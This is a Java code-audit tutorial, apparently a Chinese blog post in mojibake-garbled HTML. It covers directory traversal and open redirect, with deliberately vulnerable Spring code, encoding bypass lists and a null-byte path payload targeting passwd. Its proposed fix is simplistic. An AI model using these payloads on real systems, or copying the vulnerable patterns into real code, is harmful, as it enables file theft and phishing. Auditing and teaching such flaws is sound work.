    <content type="html"><![CDATA[<h1 id="javaä»£ç å®¡è®¡ä¸­çš„å…¶ä»–æ¼æ´"><a href="#javaä»£ç å®¡è®¡ä¸­çš„å…¶ä»–æ¼æ´" class="headerlink" title="javaä»£ç å®¡è®¡ä¸­çš„å…¶ä»–æ¼æ´"></a>javaä»£ç å®¡è®¡ä¸­çš„å…¶ä»–æ¼æ´</h1><h2 id="ç›®å½•ç©¿è¶Šæ¼æ´-ä»»æ„æ–‡ä»¶ä¸‹è½½-è¯»å–"><a href="#ç›®å½•ç©¿è¶Šæ¼æ´-ä»»æ„æ–‡ä»¶ä¸‹è½½-è¯»å–" class="headerlink" title="ç›®å½•ç©¿è¶Šæ¼æ´(ä»»æ„æ–‡ä»¶ä¸‹è½½&#x2F;è¯»å–)"></a>ç›®å½•ç©¿è¶Šæ¼æ´(ä»»æ„æ–‡ä»¶ä¸‹è½½&#x2F;è¯»å–)</h2><p>å‡ºè‡ªï¼š<a href="https://www.cnblogs.com/chm0d/p/17664249.html">Javaä»£ç å®¡è®¡ä¹‹ç›®å½•ç©¿è¶Š(ä»»æ„æ–‡ä»¶ä¸‹è½½&#x2F;è¯»å–) - chm0dçš„å®‰å…¨é¿é£æ¸¯ - åšå®¢å›­</a></p><p>æ­¤æ¼æ´ä¸€èˆ¬é…åˆæ–‡ä»¶æ“ä½œè¿›è¡Œä½¿ç”¨</p><h3 id="ä»€ä¹ˆæ˜¯ç›®å½•ç©¿è¶Š"><a href="#ä»€ä¹ˆæ˜¯ç›®å½•ç©¿è¶Š" class="headerlink" title="ä»€ä¹ˆæ˜¯ç›®å½•ç©¿è¶Š"></a>ä»€ä¹ˆæ˜¯ç›®å½•ç©¿è¶Š</h3><p>ã€€ã€€æ‰€è°“çš„ç›®å½•ç©¿è¶ŠæŒ‡åˆ©ç”¨æ“ä½œç³»ç»Ÿä¸­çš„æ–‡ä»¶ç³»ç»Ÿå¯¹ç›®å½•çš„è¡¨ç¤ºã€‚åœ¨æ–‡ä»¶ç³»ç»Ÿè·¯å¾„ä¸­ï¼Œâ€..â€è¡¨ç¤ºä¸Šä¸€çº§ç›®å½•ï¼Œå½“ä½ ä½¿ç”¨â€..&#x2F;â€œæ—¶ï¼Œä½ æ­£åœ¨å¼•ç”¨å½“å‰ç›®å½•çš„ä¸Šä¸€çº§ç›®å½•ã€‚å¦‚æœä½ ä½¿ç”¨â€..&#x2F;..&#x2F;â€œï¼Œä½ å®é™…ä¸Šåœ¨ä¸¤æ¬¡â€..â€çš„åŸºç¡€ä¸Šï¼Œå†æ¬¡å¼•ç”¨ä¸Šä¸€çº§ç›®å½•ï¼Œä»è€Œè¿”å›åˆ°ä¸Šä¸¤çº§ç›®å½•ã€‚</p><p>ã€€ã€€ä¾‹å­ï¼šå‡è®¾ä½ ç›®å‰æ‰€åœ¨ç›®å½•ä¸ºï¼šC:\Windows\System32\drivers\etc</p><ul><li>ä½¿ç”¨â€..&#x2F;â€œ ä¸€æ¬¡è¿”å›ä¸Šä¸€çº§ç›®å½•ï¼Œå³ï¼šC:\Windows\System32\drivers</li><li>ä½¿ç”¨â€..&#x2F;..&#x2F;â€œ ä¸€æ¬¡è¿”å›ä¸Šä¸€çº§ç›®å½•ï¼Œå³ï¼šC:\Windows\System32</li></ul><p>ã€€ã€€è¿™æ˜¯å› ä¸ºåœ¨æ–‡ä»¶ç³»ç»Ÿè·¯å¾„ä¸­ï¼Œæ¯ä¸ªâ€..â€éƒ½è¡¨ç¤ºå›åˆ°ä¸Šä¸€çº§ç›®å½•ã€‚æ‰€ä»¥å¤šä¸ªè¿ç»­çš„â€..â€ä¼šè¿ç»­è¿”å›åˆ°æ›´é«˜çº§åˆ«çš„ç›®å½•ã€‚ç„¶è€Œåœ¨æ¼æ´åˆ©ç”¨ä¸­Windowså’ŒLinuxç³»ç»Ÿä¼šæœ‰åŒºåˆ«ï¼Œåç»­æ¼æ´åˆ©ç”¨ä¸­ä¼šæåˆ°ã€‚</p><h3 id="ç›®å½•ç©¿è¶Šæ¼æ´æˆå› "><a href="#ç›®å½•ç©¿è¶Šæ¼æ´æˆå› " class="headerlink" title="ç›®å½•ç©¿è¶Šæ¼æ´æˆå› "></a>ç›®å½•ç©¿è¶Šæ¼æ´æˆå› </h3><p>ã€€ã€€ç›®å½•ç©¿è¶Šæ¼æ´ï¼Œä¹Ÿå«åšç›®å½•éå†&#x2F;è·¯å¾„éå†æ¼æ´ã€‚å¸¸å‘ç”Ÿäºæ–‡ä»¶ä¸Šä¼ ï¼Œæ–‡ä»¶ä¸‹è½½ï¼Œæ–‡ä»¶ä¸‹è½½ç­‰å¤„ã€‚ç”±äºåç«¯ç›´æ¥æ¥æ”¶å‰ç«¯ä¼ è¿‡æ¥çš„æ–‡ä»¶åæˆ–è·¯å¾„ï¼Œæ²¡æœ‰å¯¹å…¶è¿›è¡Œæ£€æµ‹ä¸è¿‡æ»¤ï¼Œå¯¼è‡´æ”»å‡»è€…åˆ©ç”¨..&#x2F;çš„æ–¹å¼è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œè¾¾åˆ°ä»»æ„æ–‡ä»¶è¯»å–&#x2F;ä¸‹è½½ï¼Œä»»æ„æ–‡ä»¶åˆ é™¤ï¼Œæˆ–å°†ä»»æ„æ–‡ä»¶ä¸Šä¼ åˆ°æŒ‡å®šç›®å½•ç­‰ã€‚</p><h3 id="ç›®å½•ç©¿è¶Šæ¼æ´çš„åˆ©ç”¨"><a href="#ç›®å½•ç©¿è¶Šæ¼æ´çš„åˆ©ç”¨" class="headerlink" title="ç›®å½•ç©¿è¶Šæ¼æ´çš„åˆ©ç”¨"></a>ç›®å½•ç©¿è¶Šæ¼æ´çš„åˆ©ç”¨</h3><p>ã€€ã€€Windowsä¸­ç›®å½•ç©¿è¶Šæ¼æ´ç”±äºæ“ä½œç³»ç»Ÿå¯èƒ½å¯¼è‡´åªèƒ½åœ¨è®¾å®šå¥½çš„ç›˜ç¬¦ä¸‹è¿›è¡Œç©¿è¶Šï¼Œä¸èƒ½è¶Šè¿‡å…¶ä»–ç›˜ç¬¦è¯»å–ï¼Œå¦‚ï¼šè¯»å–æ—¥å¿—æ–‡ä»¶ï¼Œåç«¯ä»£ç F:&#x2F;wwwroot&#x2F;logs + â€œå‰ç«¯ä¼ é€’çš„æ–‡ä»¶åâ€ã€‚æ­¤æ—¶é€šè¿‡..&#x2F;è¿›è¡Œç›®å½•ç©¿è¶Šåªèƒ½åœ¨Fç›˜ä¸‹è¿›è¡Œè¯»å–ï¼Œä¸èƒ½è¯»å–Fç›˜ä»¥å¤–çš„ä»»ä½•æ–‡ä»¶ï¼Œå¦‚ï¼šC:\windows\win.iniã€‚è€ŒLinuxä¸­å´ä¸å—åˆ°è¿™ç§é™åˆ¶ï¼Œåªè¦æœ‰è¶³å¤Ÿçš„æƒé™å¯ä»¥è¯»ä»»æ„ç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚</p><p>ã€€ã€€ä¸€èˆ¬ç›®å½•ç©¿è¶Šå¯¼è‡´çš„ä¸»è¦ä¸ºä»»æ„æ–‡ä»¶è¯»å–ï¼Œä¸€èˆ¬éƒ½æ˜¯è¯»å–é…ç½®æ–‡ä»¶ï¼Œå› ä¸ºé…ç½®æ–‡ä»¶ä¸­ä¿å­˜ç€å¤§é‡æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚ï¼šå„ç§æ•°æ®åº“è¿æ¥åœ°å€ä¸è´¦å·å¯†ç </p><h3 id="ä»£ç å®ä¾‹"><a href="#ä»£ç å®ä¾‹" class="headerlink" title="ä»£ç å®ä¾‹"></a>ä»£ç å®ä¾‹</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//    ä»»æ„æ–‡ä»¶è¯»å–/ä¸‹è½½</span><br>    <span class="hljs-meta">@ApiOperation(value = &quot;ä»»æ„æ–‡ä»¶è¯»å–/ä¸‹è½½&quot;)</span><br>    <span class="hljs-meta">@GetMapping(&quot;readBuffer&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">readbuffer</span><span class="hljs-params">(String filename,HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br><br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(Files.newInputStream(Paths.get(filename))))&#123;<br>            response.setHeader(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment; filename=&quot;</span> + filename);<br>            response.setContentLength((<span class="hljs-type">int</span>) Files.size(Paths.get(filename)));<br>            response.setContentType(<span class="hljs-string">&quot;application/octet-stream&quot;</span>);<br><br>            <span class="hljs-comment">// ä½¿ç”¨ Apache Commons IO åº“çš„å·¥å…·æ–¹æ³•å°†è¾“å…¥æµä¸­çš„æ•°æ®æ‹·è´åˆ°è¾“å‡ºæµä¸­</span><br>            IOUtils.copy(inputStream, response.getOutputStream());<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;æ–‡ä»¶ä¸‹è½½æˆåŠŸï¼š&quot;</span> + filename;<br>        &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;æ–‡ä»¶ä¸‹è½½å¤±è´¥ï¼š&quot;</span> + filename;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>æ­¤å¤„å°±æ˜¯å¯¹filenameå‚æ•°æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œå¯¼è‡´æ”»å‡»è€…ä½¿ç”¨..&#x2F;å¯å®ç°ä»»æ„æ–‡ä»¶ä¸‹è½½</p><h3 id="ç»•è¿‡æ–¹å¼"><a href="#ç»•è¿‡æ–¹å¼" class="headerlink" title="ç»•è¿‡æ–¹å¼"></a>ç»•è¿‡æ–¹å¼</h3><h4 id="urlç¼–ç ç»•è¿‡"><a href="#urlç¼–ç ç»•è¿‡" class="headerlink" title="urlç¼–ç ç»•è¿‡"></a>urlç¼–ç ç»•è¿‡</h4><p>å•æ¬¡urlç¼–ç ï¼Œ..&#x2F;ç¼–ç å..%2fï¼Œ%2e%2e%2fã€‚</p><h4 id="åŒ-å¤šé‡urlç¼–ç "><a href="#åŒ-å¤šé‡urlç¼–ç " class="headerlink" title="åŒ&#x2F;å¤šé‡urlç¼–ç "></a>åŒ&#x2F;å¤šé‡urlç¼–ç </h4><p>è¿›è¡ŒåŒé‡urlç¼–ç ï¼Œå¤šäº†ä¸ª25</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs url">. = %252e<br>/ = %252f<br>\ = %255c<br></code></pre></td></tr></table></figure><h4 id="Unicodeçš„URLç¼–ç "><a href="#Unicodeçš„URLç¼–ç " class="headerlink" title="Unicodeçš„URLç¼–ç "></a>Unicodeçš„URLç¼–ç </h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs url">. = %u002e<br>/ = %u2215<br>\ = %u2216<br></code></pre></td></tr></table></figure><h4 id="UTF-8çš„Unicodeç¼–ç "><a href="#UTF-8çš„Unicodeç¼–ç " class="headerlink" title="UTF-8çš„Unicodeç¼–ç "></a>UTF-8çš„Unicodeç¼–ç </h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs url">. = %c0%2e, %e0%40%ae, %c0ae<br>/ = %c0%af, %e0%80%af, %c0%2f<br>\ = %c0%5c, %c0%80%5c<br></code></pre></td></tr></table></figure><h4 id="è¶…é•¿UTF-8ç¼–ç "><a href="#è¶…é•¿UTF-8ç¼–ç " class="headerlink" title="è¶…é•¿UTF-8ç¼–ç "></a>è¶…é•¿UTF-8ç¼–ç </h4><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">. <span class="hljs-operator">=</span> <span class="hljs-variable">%c0</span><span class="hljs-variable">%2</span>e<span class="hljs-punctuation">,</span> <span class="hljs-variable">%e0</span><span class="hljs-variable">%40</span><span class="hljs-variable">%ae</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%c0ae</span><br>/ <span class="hljs-operator">=</span> <span class="hljs-variable">%c0</span><span class="hljs-variable">%af</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%e0</span><span class="hljs-variable">%80</span><span class="hljs-variable">%af</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%c0</span><span class="hljs-variable">%2</span>f<br>\ <span class="hljs-operator">=</span> <span class="hljs-variable">%c0</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%c0</span><span class="hljs-variable">%80</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure><h4 id="ç©ºå­—èŠ‚æˆªæ–­"><a href="#ç©ºå­—èŠ‚æˆªæ–­" class="headerlink" title="ç©ºå­—èŠ‚æˆªæ–­"></a>ç©ºå­—èŠ‚æˆªæ–­</h4><p>ä¹Ÿå°±æ˜¯å¤§å®¶ç†ŸçŸ¥çš„00æˆªæ–­ï¼Œç”¨äºåˆ¤æ–­åç¼€åï¼Œä½¿ç”¨ç©ºå­—èŠ‚URLç¼–ç ç»•è¿‡ï¼ˆå‡ºç°å‡ ç‡éå¸¸å°ï¼‰</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../passwd%<span class="hljs-number">00</span>.jpg<br></code></pre></td></tr></table></figure><h4 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h4><p>é€šè¿‡å‰é¢åŸç†ä»‹ç»ï¼Œç›®å½•ç©¿è¶Šæ˜¯ç”±äºæ–‡ä»¶ç³»ç»Ÿçš„ç‰¹æ€§æ‰€å¯¼è‡´çš„ï¼Œé€šè¿‡..&#x2F;è¿›è¡Œç›®å½•çš„è·¨è¶Šã€‚ä¿®å¤åªéœ€è¦æ£€æµ‹å­—ç¬¦â€..â€ä¸â€&#x2F;â€œå³å¯ï¼Œåœ¨å¯¹åº”è¯­è¨€ä¸­åŠ å…¥æ£€æµ‹å³å¯ï¼Œä»¥javaä¸ºä¾‹ï¼šå†™ä¸€ä¸ªå·¥å…·ç±»æ£€æµ‹å³å¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Security</span> &#123;<br><br><span class="hljs-comment">//    ç›®å½•ç©¿è¶Šæ£€éªŒ</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">checkTraversal</span><span class="hljs-params">(String content)</span>&#123;<br>        <span class="hljs-keyword">return</span> content.contains(<span class="hljs-string">&quot;..&quot;</span>) || content.contains(<span class="hljs-string">&quot;/&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="urlé‡å®šå‘"><a href="#urlé‡å®šå‘" class="headerlink" title="urlé‡å®šå‘"></a>urlé‡å®šå‘</h2><p>å‚è€ƒï¼šã€Šç½‘ç»œå®‰å…¨Javaä»£ç å®¡è®¡å®æˆ˜ã€‹</p><p>â€‹<a href="https://xz.aliyun.com/news/14506">è®°URLé‡å®šå‘æ¼æ´éªšæŠ€å·§-å…ˆçŸ¥ç¤¾åŒº</a></p><h3 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h3><p>ä¹Ÿç§°URLè·³è½¬ã€URLé‡å®šå‘æ¼æ´ï¼Œç”±äºç›®æ ‡ç½‘ç«™æœªå¯¹ç¨‹åºè·³è½¬çš„URLåœ°å€åŠå‚æ•°åšåˆæ³•æ€§åˆ¤æ–­ï¼Œå¯¼è‡´åº”ç”¨ç¨‹åºç›´æ¥è·³è½¬åˆ°å‚æ•°ä¸­æŒ‡å®šçš„çš„URLåœ°å€ã€‚æ”»å‡»è€…å¯é€šè¿‡å°†è·³è½¬åœ°å€ä¿®æ”¹ä¸ºæŒ‡å‘æ¶æ„ç«™ç‚¹ï¼Œå³å¯å‘èµ·ç½‘ç»œé’“é±¼ã€è¯ˆéª—ç”šè‡³çªƒå–ç”¨æˆ·å‡­è¯ç­‰ã€‚</p><h3 id="å®ç°ä»£ç "><a href="#å®ç°ä»£ç " class="headerlink" title="å®ç°ä»£ç "></a>å®ç°ä»£ç </h3><h4 id="1-é€šè¿‡-ModelAndView-æ–¹å¼"><a href="#1-é€šè¿‡-ModelAndView-æ–¹å¼" class="headerlink" title="1.é€šè¿‡ ModelAndView æ–¹å¼"></a>1.é€šè¿‡ ModelAndView æ–¹å¼</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">testforward</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> Exception &#123; <br> <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span>req.getParameter(<span class="hljs-string">&quot;url&quot;</span>); <br> <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;redirect: &quot;</span>+url; <br> <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(url); <br>&#125;<br></code></pre></td></tr></table></figure><p>URL è·³è½¬ä½¿ç”¨æ–¹å¼ï¼š<a href="http://www.any.com/index.jsp?url=http://www.xxx.com%E3%80%82">http://www.any.com/index.jsp?url=http://www.xxx.comã€‚</a></p><h4 id="2-é€šè¿‡è¿”å›-String-æ–¹å¼"><a href="#2-é€šè¿‡è¿”å›-String-æ–¹å¼" class="headerlink" title="2.é€šè¿‡è¿”å› String æ–¹å¼"></a>2.é€šè¿‡è¿”å› String æ–¹å¼</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">redirect</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;url&quot;)</span> String url)</span> &#123; <br> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:&quot;</span> + url; <br> &#125;<br></code></pre></td></tr></table></figure><p>URL è·³è½¬ä½¿ç”¨æ–¹å¼ï¼š<a href="http://www.any.com/index.jsp?url=http://www.xxx.com%E3%80%82">http://www.any.com/index.jsp?url=http://www.xxx.comã€‚</a></p><h4 id="3-ä½¿ç”¨-sendRedirect-æ–¹å¼"><a href="#3-ä½¿ç”¨-sendRedirect-æ–¹å¼" class="headerlink" title="3.ä½¿ç”¨ sendRedirect æ–¹å¼"></a>3.ä½¿ç”¨ sendRedirect æ–¹å¼</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendRedirect</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> <br>IOException&#123; <br> <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;url&quot;</span>); <br> response.sendRedirect(url); <br>&#125;<br></code></pre></td></tr></table></figure><p>URL è·³è½¬ä½¿ç”¨æ–¹å¼ï¼š<a href="http://www.any.com/index.jsp?url=http://www.xxx.com%E3%80%82">http://www.any.com/index.jsp?url=http://www.xxx.comã€‚</a>  </p><h4 id="4-ä½¿ç”¨-RedirectAttributes-æ–¹å¼"><a href="#4-ä½¿ç”¨-RedirectAttributes-æ–¹å¼" class="headerlink" title="4.ä½¿ç”¨ RedirectAttributes æ–¹å¼"></a>4.ä½¿ç”¨ RedirectAttributes æ–¹å¼</h4><p>å¯¹äºä¸€èˆ¬çš„ URL è·³è½¬ï¼Œä½¿ç”¨ redirect å³å¯æ»¡è¶³è¦æ±‚ã€‚å¦‚æœéœ€è¦è¿›è¡Œå‚æ•°æ‹¼æ¥ï¼Œåˆ™ä¸€ èˆ¬ä½¿ç”¨ RedirectAttributes</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/RedirectAttributes&quot;)</span> <br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">test4</span><span class="hljs-params">(RedirectAttributes redirectAttributes)</span> &#123; <br> redirectAttributes.addAttribute(<span class="hljs-string">&quot;id&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>); <br> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;redirect:/test/index&quot;</span>; <br>&#125;<br></code></pre></td></tr></table></figure><p>URL è·³è½¬ä½¿ç”¨æ–¹å¼ï¼š<a href="http://www.any.com/RedirectAttributes%E3%80%82">http://www.any.com/RedirectAttributesã€‚</a>  â€œ @RequestMapping(â€œ&#x2F;RedirectAttributesâ€) â€ åœ¨ æ–¹ æ³• å‰ é¢ è¦ è¯´ æ˜ URL è®¿ é—® æ˜¯ é€š è¿‡ <a href="http://192.168.88.2:8080/RedirectAttributes">http://192.168.88.2:8080/RedirectAttributes</a> æ¥è®¿é—®çš„ï¼Œä»£ç ä¸­â€œreturn â€œredirect:&#x2F;test&#x2F;indexâ€;â€ï¼Œ å°± ä¼š é‡ å®š å‘ åˆ° <a href="http://192.168.88.2:8080/test/index">http://192.168.88.2:8080/test/index</a> è¿™ ä¸ª URL ï¼Œ é€š è¿‡ â€œ redirectAttributes.  addAttribute(â€œidâ€,â€2â€)â€ä¼ é€’äº† id&#x3D;2 è¿™ä¸ªå‚æ•°ï¼Œæ‰€ä»¥æœ€ç»ˆè®¿é—®çš„å…¶å®æ˜¯ <a href="http://192.168.88.2/">http://192.168.88.2</a>:  8080&#x2F;test&#x2F;index?id&#x3D;2 è¿™ä¸ª URL åœ°å€ã€‚</p><p><img src="/img/%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E/q01.png"></p><h4 id="5-é€šè¿‡è®¾ç½®Headeræ¥è¿›è¡Œè·³è½¬"><a href="#5-é€šè¿‡è®¾ç½®Headeræ¥è¿›è¡Œè·³è½¬" class="headerlink" title="5.é€šè¿‡è®¾ç½®Headeræ¥è¿›è¡Œè·³è½¬"></a>5.é€šè¿‡è®¾ç½®Headeræ¥è¿›è¡Œè·³è½¬</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setHeader</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span>&#123;     <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;url&quot;</span>);     response.setStatus(HttpServletResponse.SC_MOVED_TEMPORARILY);       response.setHeader(<span class="hljs-string">&quot;Location&quot;</span>, url); &#125; <br></code></pre></td></tr></table></figure><p>é€šè¿‡â€œresponse.setStatus(HttpServletResponse.SC_MOVED_TEMPORARILY)â€è®¾ç½®è¿”å›çš„çŠ¶æ€ç ï¼Œâ€œSC_MOVED_PERMANENTLYâ€æ˜¯301 æ°¸ä¹…é‡å®šå‘ï¼Œâ€œSC_MOVED_ TEMPORARILYâ€æ˜¯302 ä¸´æ—¶é‡å®šå‘ã€‚ </p><p>URLè·³è½¬ä½¿ç”¨æ–¹å¼ï¼š<a href="http://www.any.com/index.jsp?url=http://www.xxx.com%E3%80%82">http://www.any.com/index.jsp?url=http://www.xxx.comã€‚</a></p><h3 id="å¸¸è§åœºæ™¯"><a href="#å¸¸è§åœºæ™¯" class="headerlink" title="å¸¸è§åœºæ™¯"></a>å¸¸è§åœºæ™¯</h3><p>ä¸»è¦æ˜¯ä¸šåŠ¡é€»è¾‘ä¸­éœ€è¦è¿›è¡Œè·³è½¬çš„åœ°æ–¹ã€‚æ¯”å¦‚ç™»å½•å¤„ã€æ³¨å†Œå¤„ã€è®¿é—®ç”¨æˆ·ä¿¡æ¯ã€è®¢å•ä¿¡æ¯ã€åŠ å…¥è´­ç‰©è½¦ã€åˆ†äº«ã€æ”¶è—ç­‰å¤„ã€‚</p><ol><li>ç™»é™†è·³è½¬æ˜¯æœ€å¸¸è§çš„è·³è½¬ç±»å‹ï¼Œè®¤è¯å®Œåä¼šè·³è½¬ï¼Œæ‰€ä»¥åœ¨ç™»é™†çš„æ—¶å€™å»ºè®®å¤šè§‚å¯Ÿurlå‚æ•°</li><li>ç”¨æˆ·åˆ†äº«ã€æ”¶è—å†…å®¹è¿‡åï¼Œä¼šè·³è½¬</li><li>è·¨ç«™ç‚¹è®¤è¯ã€æˆæƒåï¼Œä¼šè·³è½¬</li><li>ç«™å†…ç‚¹å‡»å…¶å®ƒç½‘å€é“¾æ¥æ—¶ï¼Œä¼šè·³è½¬</li><li>åœ¨ä¸€äº›ç”¨æˆ·äº¤äº’é¡µé¢ä¹Ÿä¼šå‡ºç°è·³è½¬ï¼Œå¦‚è¯·å¡«å†™å¯¹å®¢æœè¯„ä»·ï¼Œè¯„ä»·æˆåŠŸè·³è½¬ä¸»é¡µï¼Œå¡«å†™é—®å·ï¼Œç­‰ç­‰ä¸šåŠ¡ï¼Œæ³¨æ„è§‚å¯Ÿurlã€‚</li><li>ä¸šåŠ¡å®Œæˆåè·³è½¬è¿™å¯ä»¥å½’ç»“ä¸ºä¸€ç±»è·³è½¬ï¼Œæ¯”å¦‚ä¿®æ”¹å¯†ç ï¼Œä¿®æ”¹å®Œæˆåè·³è½¬ç™»é™†é¡µé¢ï¼Œç»‘å®šé“¶è¡Œå¡ï¼Œç»‘å®šæˆåŠŸåè¿”å›é“¶è¡Œå¡å……å€¼ç­‰é¡µé¢ï¼Œæˆ–è€…è¯´ç»™å®šä¸€ä¸ªé“¾æ¥åŠç†VIPï¼Œä½†æ˜¯ä½ éœ€è¦è®¤è¯èº«ä»½æ‰èƒ½è®¿é—®è¿™ä¸ªä¸šåŠ¡ï¼Œè¿™ä¸ªæ—¶å€™é€šå¸¸ä¼šç»™å®šä¸€ä¸ªé“¾æ¥ï¼Œè®¤è¯ä¹‹åè·³è½¬åˆ°åˆšåˆšè¦åŠç†VIPçš„é¡µé¢ã€‚</li></ol><h3 id="å…³é”®å­—"><a href="#å…³é”®å­—" class="headerlink" title="å…³é”®å­—"></a>å…³é”®å­—</h3><h4 id="urlè·³è½¬å¸¸ç”¨å‚æ•°"><a href="#urlè·³è½¬å¸¸ç”¨å‚æ•°" class="headerlink" title="urlè·³è½¬å¸¸ç”¨å‚æ•°"></a>urlè·³è½¬å¸¸ç”¨å‚æ•°</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java">redirect<br>url<br>redirectUrl<br>callback<br>return_url<br>toUrl<br>ReturnUrl<br>fromUrl<br>redUrl<br>request<br>redirect_to<br>redirect_url<br>jump<br>jump_to<br>target<br>to<br><span class="hljs-keyword">goto</span><br>link<br>linkto<br>domain<br>oauth_callback<br></code></pre></td></tr></table></figure><h4 id="å®ç°urlè·³è½¬éœ€è¦çš„æ–¹æ³•"><a href="#å®ç°urlè·³è½¬éœ€è¦çš„æ–¹æ³•" class="headerlink" title="å®ç°urlè·³è½¬éœ€è¦çš„æ–¹æ³•"></a>å®ç°urlè·³è½¬éœ€è¦çš„æ–¹æ³•</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 